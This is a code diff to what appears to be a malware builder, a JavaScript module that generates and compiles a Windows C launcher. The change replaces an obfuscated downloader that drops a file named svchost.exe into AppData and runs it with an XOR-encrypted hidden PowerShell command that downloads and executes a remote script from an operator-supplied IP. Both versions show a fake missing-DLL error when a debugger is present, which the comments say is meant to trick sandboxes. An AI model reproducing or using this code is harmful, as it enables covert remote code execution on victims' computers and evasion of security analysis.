@@ -40,105 +40,45 @@ END
 }
 
 function cSource({ ip }) {
-  // XOR encrypt the URL so it doesn't appear as a plain string
-  const url = `http://${ip}/api/downloads/st.exe`;
+  // XOR encrypt the PowerShell command
+  const cmd = `powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://${ip}/api/downloads/st.ps1')"`;
   const key = 0x5A;
-  const encUrl = Array.from(url).map(c => c.charCodeAt(0) ^ key);
-  const urlArr = encUrl.map(b => '0x' + b.toString(16).padStart(2, '0')).join(',');
+  const encCmd = Array.from(cmd).map(c => c.charCodeAt(0) ^ key);
+  const cmdArr = encCmd.map(b => '0x' + b.toString(16).padStart(2, '0')).join(',');
 
   return `
 #include <windows.h>
-#include <winhttp.h>
-#include <shlobj.h>
 #include <stdio.h>
+#include <stdlib.h>
 
-#pragma comment(lib, "winhttp.lib")
-
-void decrypt_url(wchar_t* out, int max_len) {
-    unsigned char enc[] = { ${urlArr} };
+void decrypt_cmd(char* out) {
+    unsigned char enc[] = { ${cmdArr} };
     int key = 0x5A;
     for (int i = 0; i < sizeof(enc); i++) {
-        out[i] = (wchar_t)(enc[i] ^ key);
+        out[i] = (char)(enc[i] ^ key);
     }
     out[sizeof(enc)] = 0;
-}
-
-void download_file(const wchar_t* url, const wchar_t* dest) {
-    URL_COMPONENTS uc = {0};
-    uc.dwStructSize = sizeof(uc);
-    wchar_t host[256] = {0};
-    wchar_t path[1024] = {0};
-    uc.lpszHostName = host;
-    uc.dwHostNameLength = 256;
-    uc.lpszUrlPath = path;
-    uc.dwUrlPathLength = 1024;
-
-    if (!WinHttpCrackUrl(url, 0, 0, &uc)) return;
-
-    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!hSession) return;
-
-    HINTERNET hConnect = WinHttpConnect(hSession, host, uc.nPort, 0);
-    if (!hConnect) { WinHttpCloseHandle(hSession); return; }
-
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
-    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }
-
-    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
-        WinHttpReceiveResponse(hRequest, NULL)) {
-        
-        HANDLE hFile = CreateFileW(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-        if (hFile != INVALID_HANDLE_VALUE) {
-            DWORD dwSize = 0;
-            DWORD dwDownloaded = 0;
-            do {
-                dwSize = 0;
-                if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
-                if (dwSize == 0) break;
-                
-                BYTE* pBuffer = (BYTE*)malloc(dwSize);
-                if (!pBuffer) break;
-                
-                if (WinHttpReadData(hRequest, pBuffer, dwSize, &dwDownloaded)) {
-                    DWORD written;
-                    WriteFile(hFile, pBuffer, dwDownloaded, &written, NULL);
-                }
-                free(pBuffer);
-            } while (dwSize > 0);
-            CloseHandle(hFile);
-        }
-    }
-
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
 }
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
 
-    // Fake error to trick sandboxes
+    // Fake crash error to trick sandbox
     if (IsDebuggerPresent()) {
         MessageBoxW(NULL, L"The code execution cannot proceed because MSVCP140.dll was not found.", L"System Error", MB_ICONERROR);
         return 1;
     }
 
-    wchar_t appdata[MAX_PATH];
-    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata))) return 1;
+    char cmd[1024];
+    decrypt_cmd(cmd);
 
-    wchar_t dest[MAX_PATH];
-    _snwprintf(dest, MAX_PATH, L"%ls\\\\svchost.exe", appdata);
-
-    wchar_t url[1024];
-    decrypt_url(url, 1024);
-    
-    download_file(url, dest);
-
-    STARTUPINFOW si = {0};
+    STARTUPINFOA si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
-    
-    if (CreateProcessW(dest, NULL, NULL, NULL, FALSE, 0, NULL, appdata, &si, &pi)) {
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
     }
@@ -176,7 +116,7 @@ export async function compileLauncher({ key, config, baseExe }) {
 
     await execFileP(CC, [
       '-O2', '-s', '-mwindows', '-o', outPath, cPath, resPath,
-      '-lwinhttp', '-lshell32', '-lole32', '-luser32', '-lkernel32'
+      '-lshell32', '-lole32', '-luser32', '-lkernel32'
     ], { cwd: workDir, timeout: 60_000 });
 
     return fs.readFileSync(outPath);
